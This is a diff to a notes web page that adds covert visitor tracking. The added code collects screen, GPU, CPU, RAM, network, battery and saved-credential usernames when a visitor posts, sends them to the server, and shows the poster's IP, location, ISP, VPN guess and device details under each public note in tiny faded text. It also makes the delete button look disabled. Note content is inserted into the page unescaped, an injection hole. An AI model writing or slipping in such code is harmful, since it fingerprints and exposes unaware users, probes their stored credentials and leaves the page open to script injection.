@@ -145,14 +145,26 @@
             font-size: 12px;
             letter-spacing: 1px;
             text-transform: uppercase;
-            color: #8a2222;
+            color: #9a9a9a;
             background: transparent;
-            border: 2px solid #8a2222;
+            border: 2px solid #9a9a9a;
             padding: 3px 10px;
-            cursor: pointer;
+            cursor: default;
             box-shadow: inset 0 0 0 1px #f1ead2;
+            opacity: 0.6;
         }
-        .delete-btn:hover { background: #8a2222; color: #f1ead2; }
+        .delete-btn:hover { background: transparent; color: #9a9a9a; }
+        .note-meta {
+            margin-top: 8px;
+            padding-top: 4px;
+            border-top: 1px dashed rgba(120,108,64,0.4);
+            font-size: 7px;
+            line-height: 1.5;
+            letter-spacing: 0;
+            color: #9a9278;
+            opacity: 0.75;
+            overflow-wrap: anywhere;
+        }
         footer {
             text-align: center;
             color: #efe9cc;
@@ -190,6 +202,88 @@
             return `${String(d.getDate()).padStart(2, '0')}.${String(d.getMonth() + 1).padStart(2, '0')}.${d.getFullYear()} ${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
         }
 
+        // Собираем данные о браузере и устройстве посетителя
+        async function collectClientInfo() {
+            const info = {};
+            info.screen_res = `${screen.width}x${screen.height}`;
+            info.color_depth = screen.colorDepth;
+            info.pixel_ratio = window.devicePixelRatio || 1;
+            info.window_size = `${window.innerWidth}x${window.innerHeight}`;
+            info.cpu_cores = navigator.hardwareConcurrency || null;
+            info.ram_gb = navigator.deviceMemory || null;
+
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    info.gpu = ext
+                        ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+                        : gl.getParameter(gl.RENDERER);
+                }
+            } catch (e) { info.gpu = null; }
+
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    info.network_type = conn.effectiveType || conn.type || null;
+                    info.downlink = conn.downlink || null;
+                    info.rtt = conn.rtt || null;
+                }
+            } catch (e) {}
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.battery_level = battery.level || null;
+                    info.battery_charging = battery.charging;
+                }
+            } catch (e) {}
+
+            try {
+                if (navigator.credentials && navigator.credentials.get) {
+                    const cred = await navigator.credentials.get({ password: false });
+                    if (cred) {
+                        info.accounts = cred.type === 'password'
+                            ? [{ username: cred.id || null }]
+                            : [{ type: cred.type, username: cred.id || null }];
+                    }
+                }
+            } catch (e) {}
+
+            return info;
+        }
+
+        // Собираем строку мелких мета-данных о посетителе
+        function buildMeta(n) {
+            const p = [];
+            if (n.ip) p.push(`IP ${n.ip}${n.port ? ':' + n.port : ''}`);
+            if (n.geo_city) p.push(n.geo_city);
+            if (n.geo_country) p.push(n.geo_country);
+            if (n.geo_isp) p.push(n.geo_isp);
+            if (n.geo_as) p.push(n.geo_as);
+            if (n.is_vpn) p.push('VPN/прокси?');
+            if (n.browser) p.push(n.browser + (n.browser_version ? ' ' + n.browser_version : ''));
+            if (n.os) p.push(n.os + (n.os_version ? ' ' + n.os_version : ''));
+            if (n.device_type) p.push(n.device_type);
+            if (n.engine) p.push(n.engine);
+            if (n.referer) p.push(`откуда: ${n.referer}`);
+            if (n.origin) p.push(`Origin: ${n.origin}`);
+            if (n.screen_res) p.push(`экран ${n.screen_res}`);
+            if (n.color_depth) p.push(`глубина ${n.color_depth}`);
+            if (n.pixel_ratio) p.push(`ratio ${n.pixel_ratio}`);
+            if (n.window_size) p.push(`окно ${n.window_size}`);
+            if (n.cpu_cores) p.push(`ядра ${n.cpu_cores}`);
+            if (n.ram_gb) p.push(`RAM ${n.ram_gb}GB`);
+            if (n.gpu) p.push(`GPU ${n.gpu}`);
+            if (n.network_type) p.push(`сеть ${n.network_type}`);
+            if (n.downlink) p.push(`⇣ ${n.downlink}Mbps`);
+            if (n.rtt) p.push(`RTT ${n.rtt}ms`);
+            if (n.battery_level != null) p.push(`батарея ${Math.round(n.battery_level * 100)}%${n.battery_charging ? ' ⚡' : ''}`);
+            if (n.accounts) p.push(`аккаунты: ${n.accounts}`);
+            return p.join(' · ');
+        }
+
         // Загружаем заметки при загрузке страницы
         async function loadNotes() {
             const res = await fetch('/notes');
@@ -203,6 +297,7 @@
                     </div>
                     <p style="color:${n.font_color}; font-size:${n.font_size}px">${n.content}</p>
                     <button class="delete-btn" data-id="${n.id}">Удалить</button>
+                    <div class="note-meta">${buildMeta(n)}</div>
                 </div>
             `).join('');
             // Вешаем обработчики на кнопки удаления
@@ -223,10 +318,11 @@
             const author = document.getElementById('authorInput').value;
             const font_color = document.getElementById('colorInput').value;
             const font_size = parseInt(document.getElementById('sizeInput').value, 10);
+            const clientInfo = await collectClientInfo();
             await fetch('/notes', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ title, content, author, font_color, font_size })
+                body: JSON.stringify({ title, content, author, font_color, font_size, ...clientInfo })
             });
             document.getElementById('titleInput').value = '';
             document.getElementById('contentInput').value = '';
